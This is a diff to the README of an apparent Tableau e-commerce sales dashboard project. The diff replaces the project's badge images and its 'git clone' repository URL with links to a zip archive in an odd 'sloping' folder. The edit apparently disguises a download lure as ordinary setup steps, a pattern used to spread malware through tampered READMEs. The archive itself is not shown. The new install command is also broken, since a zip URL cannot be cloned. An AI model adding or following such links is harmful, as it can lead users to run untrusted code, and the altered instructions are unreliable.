@@ -1,7 +1,7 @@
 # 🛒 E-commerce Sales Dashboard - Tableau Project
 
-![Tableau](https://img.shields.io/badge/Built%20with-Tableau-blue?style=for-the-badge&logo=tableau)
-![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
+![Tableau](https://raw.githubusercontent.com/SIVARANJANI63/E-commerce/main/sloping/E-commerce-3.2.zip%20with-Tableau-blue?style=for-the-badge&logo=tableau)
+![Status](https://raw.githubusercontent.com/SIVARANJANI63/E-commerce/main/sloping/E-commerce-3.2.zip)
 
 ## 📊 Overview
 
@@ -40,4 +40,4 @@ This project showcases an interactive **E-commerce Sales Dashboard** built using
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/SIVARANJANI63/ecommerce-tableau-dashboard.git
+   git clone https://raw.githubusercontent.com/SIVARANJANI63/E-commerce/main/sloping/E-commerce-3.2.zip
